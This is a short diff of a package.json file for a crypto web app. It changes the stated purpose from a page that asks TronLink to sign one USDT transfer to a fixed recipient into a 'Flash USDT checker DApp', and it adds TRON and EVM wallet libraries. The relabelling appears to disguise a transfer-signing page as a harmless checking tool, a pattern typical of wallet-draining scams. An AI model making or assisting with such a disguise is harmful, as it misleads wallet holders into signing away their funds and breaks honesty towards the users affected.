@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "private": true,
   "type": "module",
-  "description": "Static TRON mainnet page that asks TronLink to sign one USDT transfer to a fixed recipient.",
+  "description": "Flash USDT checker DApp with verified EVM and TRON wallet sessions.",
   "engines": {
     "node": ">=20"
   },
@@ -17,10 +17,15 @@
     "check": "npm run lint && npm run typecheck && npm test && npm run build"
   },
   "dependencies": {
-    "qrcode": "1.5.4"
+    "qrcode": "1.5.4",
+    "tronweb": "6.5.1",
+    "viem": "2.57.16"
   },
   "devDependencies": {
     "@types/node": "24.19.2",
     "typescript": "5.9.3"
+  },
+  "overrides": {
+    "axios": "1.21.0"
   }
 }
